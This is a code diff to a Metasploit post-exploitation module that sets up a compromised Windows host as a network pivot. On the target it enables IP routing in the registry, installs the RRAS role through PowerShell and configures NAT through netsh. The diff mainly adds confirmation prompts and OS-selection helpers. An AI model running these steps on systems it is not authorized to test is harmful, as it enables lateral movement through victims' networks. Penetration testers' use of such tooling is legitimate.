@@ -80,6 +80,96 @@ class MetasploitModule < Msf::Post
 	end
 	
 	#
+	# Ask the user if want to continue with an action
+	#
+	def continue_execution(msg)
+		print_status(msg.to_s)
+		continue = "N"
+		continue = gets.chomp
+		continue = continue.gsub("\n","")
+		while not ['y','Y','n','N'].include? continue
+			print_status("Please, enter Y or N.")
+			continue = gets.chomp
+			continue = continue.gsub("\n","")
+		end
+		return continue
+	end
+	
+	#
+	# Return the SO in format "Windows <version>"
+	#
+	def getSO(str_os)
+		version = "Unknown"
+		if str_os =~ /Windows 2008/
+			version = "Windows 2008"
+		elsif str_os =~ /Windows 2012/
+			version = "Windows 2012"
+		elsif str_os =~ /Windows XP/
+			version = "Windows XP"
+		elsif str_os =~ /Windows 2003/
+			version = "Windows 2003"
+		elsif str_os =~ /Windows 7/
+			version = "Windows 7"
+		elsif str_os =~ /Windows 8/
+			version = "Windows 8"
+		elsif str_os =~ /Windows 10/
+			version = "Windows 10"
+		elsif str_os =~ /Windows Vista/
+			version = "Windows Vista"
+		elsif str_os =~ /Windows 2016/
+			version = "Windows 2016"
+		end
+		return version
+	end
+	
+	#
+	# Return the pivot SO specified by the user
+	#
+	def chooseOS()
+	
+		version = ""
+		while not ["1","2","3","4","5","6","7","8","9"].include? version
+			print_status("Please, select a valid option (1,2,3,4,5,6,7,8 or 9)")
+			puts("1) Windows XP")
+			puts("2) Windows 2003")
+			puts("3) Windows Vista")
+			puts("4) Windows 7")
+			puts("5) Windows 8")
+			puts("6) Windows 10")
+			puts("7) Windows 2008")
+			puts("8) Windows 2012")
+			puts("9) Windows 2016")
+			version = gets.chomp
+			version = version.gsub("\n","")
+		end
+		v = ""
+		if version == "7"
+			v = "Windows 2008"
+		elsif version == "8"
+			v = "Windows 2012"
+		elsif version == "1"
+			v = "Windows XP"
+		elsif version == "2"
+			v = "Windows 2003"
+		elsif version == "4"
+			v = "Windows 7"
+		elsif version == "5"
+			v = "Windows 8"
+		elsif version == "6"
+			v = "Windows 10"
+		elsif version == "3"
+			v = "Windows Vista"
+		elsif version == "9"
+			v = "Windows 2016"
+		else
+			v = "Windows"
+		end
+		
+		return v
+	
+	end
+	
+	#
 	# Windows commands
 	#
 	def windows_pivot()
@@ -90,19 +180,27 @@ class MetasploitModule < Msf::Post
 			rra_status = getStatus(rra_info[:status])
 			key = "HKLM\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\\"
 			iprouting_reg_status = registry_getvalinfo(key,"IPEnableRouter")["Data"]
-			win_version = session.sys.config.sysinfo['OS']
-			print_status("Operating System: #{win_version}")
+			win_version = getSO(session.sys.config.sysinfo['OS'])
+			continue = continue_execution("Operating System: #{win_version}. Is it correct? (Y/n)")
+			if ["n","N"].include? continue
+				win_version = chooseOS()
+			end
 			print_status("Starting the proccess...")			
 			
 			# Common to all windows versions
 			print_status("Enabling IP Router...")
 			
 			if iprouting_reg_status != 1
-				if registry_setvaldata(key, "IPEnableRouter", "1", "REG_DWORD")
-					print_good("	IP Routing is Enabled.")
+				continue = continue_execution("The registry value of IPEnableRouter has to set to 1 in the pivot. Do you want to continue? (y/N)")
+				if ["y","Y"].include? continue
+					if registry_setvaldata(key, "IPEnableRouter", "1", "REG_DWORD")
+						print_good("	IP Routing is Enabled.")
+					else
+						print_bad("  	There was an error setting the IPEnableRouter value.")
+						# Exit.
+						abort("Aborting module...")
+					end
 				else
-					print_bad("  	There was an error setting the IPEnableRouter value.")
-					# Exit.
 					abort("Aborting module...")
 				end
 			else
@@ -113,14 +211,7 @@ class MetasploitModule < Msf::Post
 				if have_powershell?
 					rol_status = psh_exec("Import-Module ServerManager; Get-WindowsFeature | findstr 'NPAS-RRAS-Services' | findstr '[X'")
 					if rol_status == ""
-						print_status("It's necessary install Routing and Remote Access rol in the server. Do you want to continue?(N/y)")
-						continue = gets.chomp
-						continue = continue.gsub("\n","")
-						while not ['y','Y','n','N'].include? continue
-							print_status("Please, enter Y or N.")
-							continue = gets.chomp
-							continue = continue.gsub("\n","")
-						end
+						continue = continue_execution("It's necessary install Routing and Remote Access rol in the pivot. Do you want to continue?(N/y)")
 						if ['y','Y'].include? continue
 							print_status("Powershell is installed in #{win_version['OS']}. Trying to install the Routing and Remote Access rol.")
 							# Windows 2008
@@ -140,14 +231,7 @@ class MetasploitModule < Msf::Post
 				if have_powershell?
 					rol_status = psh_exec("Import-Module ServerManager; Get-WindowsFeature | findstr 'Routing' | findstr '[X'")
 					if not rol_status.include? "Installed"
-						print_status("It's necessary install Routing and Remote Access rol in the server. Do you want to continue?(N/y)")
-						continue = gets.chomp
-						continue = continue.gsub("\n","")
-						while not ['y','Y','n','N'].include? continue
-							print_status("Please, enter Y or N.")
-							continue = gets.chomp
-							continue = continue.gsub("\n","")
-						end
+						continue = continue_execution("It's necessary install Routing and Remote Access rol in the pivot. Do you want to continue?(N/y)")
 						if ['y','Y'].include? continue
 							print_status("Powershell is installed in #{win_version}. Trying to install the services.")
 							psh_exec("Import-Module ServerManager; Add-WindowsFeature Routing")
@@ -158,21 +242,28 @@ class MetasploitModule < Msf::Post
 						print_status("The services are installed. It's not necessary to install them")
 					end
 				else
-					print_bad("Powershell is not installed in #{win_version}. For this windows version (#{win_version['OS']}) we can't continue the execution.")
+					print_bad("Powershell is not installed in #{win_version}. For this windows version (#{win_version}) we can't continue the execution.")
 					abort("Aborting module...")
 				end
 			elsif win_version=~ /Windows 8/ or  win_version['OS']=~ /Windows 7/ or  win_version['OS']=~ /Windows 10/
 				print_bad("The system #{win_version} is not compatible with this module. The compatible systems are: Windows XP, Windows Server 2003, Windows Server 2008, windows Server 2012 and Windows Server 2016.")
+				abort("Aborting module...")
 			else
 				print_bad("The system #{win_version} is not compatible with this module. The compatible systems are: Windows XP, Windows Server 2003, Windows Server 2008, windows Server 2012 and Windows Server 2016.")
+				abort("Aborting module...")
 			end
 			
 			# Common to all windows versions
 			
-			print_status("Configuring interfaces...")
-			cmd_exec("netsh routing ip nat install")
-			cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt02']}\" full")
-			cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt01']}\" private")
+			continue = continue_execution("It's necessary to configure NAT interfaces options in the pivot. Do you want to continue? (y/N)")
+			if ["y","Y"].include? continue
+				print_status("Configuring interfaces...")
+				cmd_exec("netsh routing ip nat install")
+				cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt02']}\" full")
+				cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt01']}\" private")
+			else
+				abort("Aborting module...")
+			end
 			
 			# Specific instructions for each windows version
 			
@@ -222,8 +313,6 @@ class MetasploitModule < Msf::Post
 	# check the format of parameter NET
 	#
 	def check_rnet()
-		
-		
 		if get_cidr(datastore['NET']) == false or not((0..33).include?(get_cidr(datastore['NET']))) or not(Rex::Socket.is_ipv4?(get_net(datastore['NET'])))
 			print_bad("You need to provide IPv4 network in NET parameter. Example: 192.168.1.0/24")
 			return false
@@ -384,6 +473,7 @@ class MetasploitModule < Msf::Post
   	# MAIN PROGRAM
   	#
 	def run
+
 		if check_rnet()
 			case session.platform
 			when 'linux'
